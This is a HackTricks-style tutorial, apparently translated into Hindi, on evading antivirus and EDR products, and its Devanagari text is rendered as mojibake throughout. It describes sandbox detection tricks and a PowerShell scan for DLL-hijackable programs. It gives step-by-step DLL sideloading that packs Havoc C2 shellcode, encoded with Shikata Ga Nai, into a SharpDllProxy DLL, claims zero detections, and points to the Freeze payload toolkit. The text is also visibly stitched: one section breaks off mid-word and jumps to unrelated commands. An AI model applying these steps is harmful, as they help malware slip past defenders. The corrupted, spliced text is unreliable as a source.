# Antivirus (AV) рдмрд╛рдпрдкрд╛рд╕

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рддрдХ рдкрд╣реБрдБрдЪ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**рдЗрд╕ рдкреЗрдЬ рдХреЛ** [**@m2rc\_p**](https://twitter.com/m2rc\_p)** рдиреЗ рд▓рд┐рдЦрд╛ рд╣реИ!**

## **AV Evasion Methodology**

рд╡рд░реНрддрдорд╛рди рдореЗрдВ, AVs рдлрд╛рдЗрд▓ рдХреЛ рдореИрд▓рд┐рд╢рд╕ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рд╕реНрдЯреИрдЯрд┐рдХ рдбрд┐рдЯреЗрдХреНрд╢рди, рдбрд╛рдпрдирд╛рдорд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг, рдФрд░ рдЕрдзрд┐рдХ рдЙрдиреНрдирдд EDRs рдХреЗ рд▓рд┐рдП, рд╡реНрдпрд╡рд╣рд╛рд░рд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдгред

### **рд╕реНрдЯреИрдЯрд┐рдХ рдбрд┐рдЯреЗрдХреНрд╢рди**

рд╕реНрдЯреИрдЯрд┐рдХ рдбрд┐рдЯреЗрдХреНрд╢рди рдХреЛ рдмрд╛рдЗрдирд░реА рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдЬреНрдЮрд╛рдд рдореИрд▓рд┐рд╢рд╕ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдпрд╛ рдмрд╛рдЗрдЯреНрд╕ рдХреЗ рдЕрд░реНрд░реЗрдЬ рдХреЛ рдлреНрд▓реИрдЧрд┐рдВрдЧ рдХрд░рдХреЗ, рдФрд░ рдлрд╛рдЗрд▓ рд╕реЗ рд╕реНрд╡рдпрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдХрд░ (рдЬреИрд╕реЗ рдХрд┐ рдлрд╛рдЗрд▓ рд╡рд┐рд╡рд░рдг, рдХрдВрдкрдиреА рдХрд╛ рдирд╛рдо, рдбрд┐рдЬрд┐рдЯрд▓ рд╣рд╕реНрддрд╛рдХреНрд╖рд░, рдЖрдЗрдХрди, рдЪреЗрдХрд╕рдо, рдЖрджрд┐) рд╣рд╛рд╕рд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЬреНрдЮрд╛рдд рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЯреВрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдЖрдк рдЕрдзрд┐рдХ рдЖрд╕рд╛рдиреА рд╕реЗ рдкрдХрдбрд╝реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдЙрдиреНрд╣реЗрдВ рд╕рдВрднрд╡рддрдГ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдореИрд▓рд┐рд╢рд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдлреНрд▓реИрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдбрд┐рдЯреЗрдХреНрд╢рди рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ:

* **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди**

рдпрджрд┐ рдЖрдк рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ AV рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреЗ рд▓реЛрдбрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

* **рдСрдмреНрдлрд╕реНрдХреЗрд╢рди**

рдХрднреА-рдХрднреА рдЖрдкрдХреЛ AV рдХреЛ рдкрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рдмрд╛рдЗрдирд░реА рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдХреБрдЫ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рдмрджрд▓рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдСрдмреНрдлрд╕реНрдХреЗрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдЙрд╕рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдПрдХ рд╕рдордп рд▓реЗрдиреЗ рд╡рд╛рд▓рд╛ рдХрд╛рд░реНрдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

* **рдХрд╕реНрдЯрдо рдЯреВрд▓рд┐рдВрдЧ**

рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдЯреВрд▓реНрд╕ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХреЛрдИ рдЬреНрдЮрд╛рдд рдмреБрд░реЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рдмрд╣реБрдд рд╕рдордп рдФрд░ рдкреНрд░рдпрд╛рд╕ рд▓рдЧрддрд╛ рд╣реИред

{% hint style="info" %}
Windows Defender рд╕реНрдЯреИрдЯрд┐рдХ рдбрд┐рдЯреЗрдХреНрд╢рди рдХреЗ рдЦрд┐рд▓рд╛рдл рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) рд╣реИред рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рдлрд╛рдЗрд▓ рдХреЛ рдХрдИ рдЦрдВрдбреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ Defender рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдПрдХ рдХреЛ рд╡реНрдпрдХреНрддрд┐рдЧрдд рд░реВрдк рд╕реЗ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХрд╛ рдХрд╛рд░реНрдп рджреЗрддрд╛ рд╣реИ, рдЗрд╕ рддрд░рд╣, рдпрд╣ рдЖрдкрдХреЛ рдмрд┐рд▓реНрдХреБрд▓ рдмрддрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рдмрд╛рдЗрдирд░реА рдореЗрдВ рдХреМрди рд╕реЗ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдпрд╛ рдмрд╛рдЗрдЯреНрд╕ рдлреНрд▓реИрдЧ рдХрд┐рдП рдЧрдП рд╣реИрдВред
{% endhint %}

рдореИрдВ рдЖрдкрдХреЛ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ AV Evasion рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЗрд╕ [YouTube рдкреНрд▓реЗрд▓рд┐рд╕реНрдЯ](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) рдХреЛ рджреЗрдЦрдиреЗ рдХреА рдЕрддреНрдпрдзрд┐рдХ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реВрдБред

### **рдбрд╛рдпрдирд╛рдорд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг**

рдбрд╛рдпрдирд╛рдорд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рддрдм рд╣реЛрддрд╛ рд╣реИ рдЬрдм AV рдЖрдкрдХреЗ рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдХ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рдЪрд▓рд╛рддрд╛ рд╣реИ рдФрд░ рдореИрд▓рд┐рд╢рд╕ рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЗ рд▓рд┐рдП рджреЗрдЦрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдЖрдкрдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдбреНрд╕ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдФрд░ рдкрдврд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдирд╛, LSASS рдкрд░ рдорд┐рдирд┐рдбрдВрдк рдХрд░рдирд╛, рдЖрджрд┐)ред рдпрд╣ рднрд╛рдЧ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдереЛрдбрд╝рд╛ рдЬрдЯрд┐рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣рд╛рдБ рдХреБрдЫ рдЪреАрдЬреЗрдВ рд╣реИрдВ рдЬреЛ рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

* **рдирд┐рд╖реНрдкрд╛рджрди рд╕реЗ рдкрд╣рд▓реЗ рд╕реНрд▓реАрдк** рдпрд╣ рдХреИрд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдЖрдзрд╛рд░ рдкрд░, AV рдХреЗ рдбрд╛рдпрдирд╛рдорд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╢рд╛рдирджрд╛рд░ рддрд░реАрдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред AV рдХреЗ рдкрд╛рд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдХреЛ рдмрд╛рдзрд┐рдд рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХрд╛ рдмрд╣реБрдд рдХрдо рд╕рдордп рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд▓рдВрдмреЗ рд╕реНрд▓реАрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдмрд╛рдЗрдирд░реАрдЬ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдмрд╛рдзрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдХрдИ AV рдХреЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╕реНрд▓реАрдк рдХреЛ рдХреИрд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╕реНрд▓реАрдк рдХреЛ рдмрд╕ рд╕реНрдХрд┐рдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* **рдорд╢реАрди рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреА рдЬрд╛рдВрдЪ** рдЖрдорддреМрд░ рдкрд░ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЗ рдкрд╛рд╕ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдХрдо рд╕рдВрд╕рд╛рдзрди рд╣реЛрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ < 2GB RAM), рдЕрдиреНрдпрдерд╛ рд╡реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдорд╢реАрди рдХреЛ рдзреАрдорд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдпрд╣рд╛рдБ рдмрд╣реБрдд рд░рдЪрдирд╛рддреНрдордХ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП CPU рдХреЗ рддрд╛рдкрдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдпрд╛ рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдлреИрди рдХреА рдЧрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ, рд╕рдм рдХреБрдЫ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рд▓рд╛рдЧреВ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
* **рдорд╢реАрди-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЬрд╛рдВрдЪ** рдпрджрд┐ рдЖрдк "contoso.local" рдбреЛрдореЗрди рд╕реЗ рдЬреБрдбрд╝реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХрд╛рд░реНрдпрд╕реНрдерд╛рди рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдХрдВрдкреНрдпреВрдЯрд░ рдХреЗ рдбреЛрдореЗрди рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╡рд╛рд▓реЗ рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ, рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рдЖрдк рдЕрдкрдиреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдкрддрд╛ рдЪрд▓рд╛ рд╣реИ рдХрд┐ Microsoft Defender рдХреЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХрд╛ рдХрдВрдкреНрдпреВрдЯрд░рдирд╛рдо HAL9TH рд╣реИ, рдЗрд╕рд▓рд┐рдП, рдЖрдк рдЕрдкрдиреЗ рдореИрд▓рд╡реЗрдпрд░ рдореЗрдВ рдХрдВрдкреНрдпреВрдЯрд░ рдХреЗ рдирд╛рдо рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд┐рд╕реНрдлреЛрдЯ рд╕реЗ рдкрд╣рд▓реЗ, рдпрджрд┐ рдирд╛рдо HAL9TH рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдбрд┐рдлреЗрдВрдбрд░ рдХреЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЕрдкрдиреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>рд╕реНрд░реЛрдд: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

рд╕реИрдВ
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

рдпрд╣ рдХрдорд╛рдВрдб "C:\Program Files\\" рдореЗрдВ DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкреНрд░реЛрдЧреНрд░рд╛рдореЛрдВ рдХреА рд╕реВрдЪреА рдФрд░ рдЙрдирдХреЗ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА DLL рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдЖрдЙрдЯрдкреБрдЯ рдХрд░реЗрдЧрд╛ред

рдореИрдВ рдЖрдкрдХреЛ **рдЦреБрдж DLL Hijackable/Sideloadable рдкреНрд░реЛрдЧреНрд░рд╛рдореЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рджреГрдврд╝рддрд╛ рд╕реЗ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реВрдБ**, рдпрд╣ рддрдХрдиреАрдХ рдареАрдХ рд╕реЗ рдХреА рдЬрд╛рдП рддреЛ рдХрд╛рдлреА рдЪреБрдкрдХреЗ рд╕реЗ рд╣реЛ рд╕рдХрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдЖрдк рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЬреНрдЮрд╛рдд DLL Sideloadable рдкреНрд░реЛрдЧреНрд░рд╛рдореЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдкрдХрдбрд╝реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдХреЗрд╡рд▓ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DLL рдХреЛ рдЙрд╕ рдирд╛рдо рд╕реЗ рд░рдЦрдиреЗ рд╕реЗ, рдЬрд┐рд╕реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ, рдЖрдкрдХрд╛ рдкреЗрд▓реЛрдб рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЙрд╕ DLL рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрдВрдХреНрд╢рдиреНрд╕ рдХреА рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХреЛ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо **DLL Proxying/Forwarding** рдирд╛рдордХ рдПрдХ рдФрд░ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред

**DLL Proxying** рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдкреНрд░реЙрдХреНрд╕реА (рдФрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг) DLL рд╕реЗ рдореВрд▓ DLL рддрдХ рдХреЙрд▓реНрд╕ рдХреЛ рдлреЙрд░рд╡рд░реНрдб рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдмрдирд╛рдП рд░рдЦрддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЗ рдкреЗрд▓реЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред

рдореИрдВ [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реВрдБрдЧрд╛ рдЬреЛ [@flangvik](https://twitter.com/Flangvik/) рд╕реЗ рд╣реИред

рдореИрдВрдиреЗ рдЬреЛ рдХрджрдо рдЙрдард╛рдП рд╡реЗ рдпреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

рдЕрдВрддрд┐рдо рдХрдорд╛рдВрдб рд╣рдореЗрдВ 2 рдлрд╛рдЗрд▓реЗрдВ рджреЗрдЧрд╛: рдПрдХ DLL рд╕реЛрд░реНрд╕ рдХреЛрдб рдЯреЗрдореНрдкрд▓реЗрдЯ, рдФрд░ рдореВрд▓ рдкреБрдирдГ рдирд╛рдорд┐рдд DLLред

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

рдпреЗ рдкрд░рд┐рдгрд╛рдо рд╣реИрдВ:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

рд╣рдорд╛рд░реЗ рд╢реЗрд▓рдХреЛрдб (рдЬрд┐рд╕реЗ [SGN](https://github.com/EgeBalci/sgn) рдХреЗ рд╕рд╛рде рдПрдиреНрдХреЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ) рдФрд░ рдкреНрд░реЙрдХреНрд╕реА DLL рджреЛрдиреЛрдВ рдХрд╛ [antiscan.me](https://antiscan.me) рдореЗрдВ 0/26 рдбрд┐рдЯреЗрдХреНрд╢рди рд░реЗрдЯ рд╣реИ! рдореИрдВ рдЗрд╕реЗ рд╕рдлрд▓рддрд╛ рдХрд╣реВрдВрдЧрд╛ред

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
рдореИрдВ **рджреГрдврд╝рддрд╛ рд╕реЗ рд╕реБрдЭрд╛рд╡ рджреЗрддрд╛ рд╣реВрдБ** рдХрд┐ рдЖрдк [S3cur3Th1sSh1t рдХреЗ рдЯреНрд╡рд┐рдЪ VOD](https://www.twitch.tv/videos/1644171543) рдХреЛ рджреЗрдЦреЗрдВ рдЬреЛ DLL Sideloading рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣реИ рдФрд░ рд╕рд╛рде рд╣реА [ippsec рдХрд╛ рд╡реАрдбрд┐рдпреЛ](https://www.youtube.com/watch?v=3eROsG\_WNpE) рднреА рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ рдЖрдк рдЬреЛ рд╣рдордиреЗ рдЪрд░реНрдЪрд╛ рдХреА рд╣реИ рдЙрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЬрд╛рди рд╕рдХреЗрдВред
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze рдПрдХ рдкреЗрд▓реЛрдб рдЯреВрд▓рдХрд┐рдЯ рд╣реИ рдЬреЛ рд╕рд╕реНрдкреЗрдВрдбреЗрдб рдкреНрд░реЛрд╕реЗрд╕реЗрд╕, рдбрд╛рдпрд░реЗрдХреНрдЯ рд╕рд┐рд╕реНрдХреЙрд▓реНрд╕, рдФрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдореЗрдердбреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ EDRs рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ`

рдЖрдк Freeze рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╢реЗрд▓рдХреЛрдб рдХреЛ рдПрдХ рдЪреБрдкрдХреЗ рддрд░реАрдХреЗ рд╕реЗ рд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
